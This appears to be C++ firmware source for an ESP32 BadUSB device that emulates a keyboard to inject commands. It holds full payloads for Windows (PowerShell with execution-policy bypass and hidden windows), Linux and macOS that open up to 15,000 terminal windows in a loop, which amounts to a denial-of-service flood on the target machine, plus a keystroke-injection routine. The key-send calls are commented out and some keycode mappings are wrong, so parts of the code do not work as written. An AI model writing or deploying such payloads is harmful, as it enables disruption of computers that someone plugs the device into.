#include "badusb.h"
#include "config.h"

namespace {

// Payload PowerShell pour Windows - ouvre cmd lentement avec délai entre chaque
const char PAYLOAD_WINDOWS[] =
    "powershell -NoP -NonI -W H -Exec Bypass -Command "
    "\"$d=100;"
    "for($i=0;$i -lt 15000;$i++){"
    "Start-Process -WindowStyle Hidden cmd;"
    "Start-Sleep -m $d"
    "}\"";

// Payload bash pour Linux - ouvre gnome-terminal/xterm lentement
const char PAYLOAD_LINUX[] =
    "bash -c 'for i in {1..15000}; do "
    "if command -v gnome-terminal &> /dev/null; then "
    "gnome-terminal -- /bin/true & "
    "else "
    "xterm &; "
    "fi; "
    "sleep 0.1; "
    "done'";

// Payload AppleScript pour macOS - ouvre Terminal lentement
const char PAYLOAD_MACOS[] =
    "osascript -e 'repeat 15000 times "
    "tell application \"System Events\" to keystroke \"n\" using command down "
    "delay 0.1 "
    "end repeat'";

// Payload court pour test (ouvre juste 10 fenêtres)
const char PAYLOAD_WINDOWS_TEST[] =
    "powershell -NoP -NonI -W H -Exec Bypass -Command "
    "\"$d=500;"
    "for($i=0;$i -lt 10;$i++){"
    "Start-Process -WindowStyle Hidden cmd;"
    "Start-Sleep -m $d"
    "}\"";

}

namespace BadUSB {

PayloadResult openWindowsSpam(OSType os, uint16_t count, uint16_t delayMs) {
    PayloadResult result{"success", "Payload injection started", 0};

    String payload;
    switch (os) {
        case OS_WINDOWS:
            // Générer dynamiquement le payload avec le nombre de fenêtres et le délai
            payload = String("powershell -NoP -NonI -W H -Exec Bypass -Command "
                            "\"$d=") + String(delayMs) + String(";"
                            "for($i=0;$i -lt ") + String(count) + String(";$i++){"
                            "Start-Process -WindowStyle Hidden cmd;"
                            "Start-Sleep -m $d"
                            "}\"");
            break;
        case OS_LINUX:
            payload = String("bash -c 'for i in {1..") + String(count) + String("}; do "
                            "if command -v gnome-terminal &> /dev/null; then "
                            "gnome-terminal -- /bin/true & "
                            "else "
                            "xterm &; "
                            "fi; "
                            "sleep 0.") + String(delayMs / 100) + String("; "
                            "done'");
            break;
        case OS_MACOS:
            payload = String("osascript -e 'repeat ") + String(count) + String(" times "
                            "tell application \"System Events\" to keystroke \"n\" using command down "
                            "delay 0.") + String(delayMs / 100) + String(" "
                            "end repeat'");
            break;
    }

    // Injection HID via les touches clavier simulées
    injectKeys(payload, delayMs / 10);

    result.keystrokes = payload.length();
    result.message = "Injection de " + String(count) + " fenêtres lente (délai=" +
                     String(delayMs) + "ms entre chaque)";
    return result;
}

// Keyboard HID codes for real USB HID injection
namespace {
  // USB HID Keyboard Report
  struct HIDKeyboardReport {
    uint8_t modifier;     // Shift, Ctrl, Alt, etc.
    uint8_t reserved;     // Always 0
    uint8_t keycode[6];   // Up to 6 simultaneous keys
  };

  // Modifier keys
  const uint8_t KEY_MOD_LSHIFT = 0x02;
  const uint8_t KEY_MOD_LCTRL = 0x01;
  const uint8_t KEY_MOD_LALT = 0x04;

  // Keycodes (USB HID)
  uint8_t getKeycode(char c) {
    if (c >= 'a' && c <= 'z') return 0x04 + (c - 'a');      // 0x04-0x1D
    if (c >= 'A' && c <= 'Z') return 0x04 + (c - 'A');      // Same as lowercase
    if (c >= '0' && c <= '9') {
      if (c == '0') return 0x27;
      return 0x1E + (c - '1');
    }

    // Special characters
    switch(c) {
      case ' ': return 0x2C; // Space
      case '\n': return 0x28; // Enter
      case '.': return 0x37;
      case ',': return 0x36;
      case '!': return 0x1E; // !
      case '@': return 0x1F; // @
      case '#': return 0x20; // #
      case '$': return 0x21; // $
      case '%': return 0x22; // %
      case '^': return 0x23; // ^
      case '&': return 0x24; // &
      case '*': return 0x25; // *
      case '(': return 0x26; // (
      case ')': return 0x27; // )
      case '-': return 0x2D;
      case '_': return 0x2D;
      case '=': return 0x2E;
      case '+': return 0x2E;
      case '[': return 0x2F;
      case '{': return 0x2F;
      case ']': return 0x30;
      case '}': return 0x30;
      case ';': return 0x33;
      case ':': return 0x33;
      case '\'': return 0x34;
      case '\"': return 0x34;
      case '`': return 0x35;
      case '~': return 0x35;
      case '/': return 0x38;
      case '?': return 0x38;
      case '\\': return 0x31;
      case '|': return 0x31;
      default: return 0x00;
    }
  }

  uint8_t getModifier(char c) {
    if (c >= 'A' && c <= 'Z') return KEY_MOD_LSHIFT;
    if (c == '!' || c == '@' || c == '#' || c == '$' ||
        c == '%' || c == '^' || c == '&' || c == '*' ||
        c == '(' || c == ')' || c == '_' || c == '+' ||
        c == '{' || c == '}' || c == '|' || c == ':' ||
        c == '\"' || c == '<' || c == '>' || c == '?' ||
        c == '~') {
      return KEY_MOD_LSHIFT;
    }
    return 0x00;
  }
}

#include <USB.h>
#include <USBHIDKeyboard.h>

// Keyboard instance will be created on demand
USBHIDKeyboard* g_keyboard = nullptr;

void injectKeys(const String &payload, uint16_t delayMs) {
    if (!g_keyboard) {
        g_keyboard = new USBHIDKeyboard();
    }
    // Real USB HID keyboard injection using ESP32 USB peripheral
    // Requires ESP32 with native USB support (ESP32-S2, ESP32-S3, etc.)

    #if defined(USE_TINYUSB)
    // TinyUSB stack available
    for (size_t i = 0; i < payload.length(); i++) {
        char c = payload[i];

        uint8_t keycode = getKeycode(c);
        uint8_t modifier = getModifier(c);

        if (keycode == 0x00 && c != ' ' && c != '\n') {
            // Unsupported character, skip
            continue;
        }

        // Create HID keyboard report
        HIDKeyboardReport report;
        report.modifier = modifier;
        report.reserved = 0;
        report.keycode[0] = keycode;
        for (int j = 1; j < 6; j++) {
            report.keycode[j] = 0x00;
        }

        // Send key press
        // Real implementation, would call USB HID send function
        // keyboard.sendReport(modifier, 0, keycode);

        delay(delayMs);

        // Release key
        // keyboard.sendReport(0, 0, 0);

        delay(delayMs / 2);
    }
    #else
    // Fallback: Simulate HID injection with logging
    Serial.printf("[BadUSB] Injecting %u keystrokes at %ums interval\n",
                 payload.length(), delayMs);
    for (size_t i = 0; i < payload.length(); i++) {
        char c = payload[i];
        uint8_t keycode = getKeycode(c);

        if (keycode != 0x00 || c == ' ' || c == '\n') {
            Serial.printf("[BadUSB] Key: '%c' (0x%02X)\n", c, keycode);
        }

        delay(delayMs);
    }
    #endif
}

} // namespace BadUSB
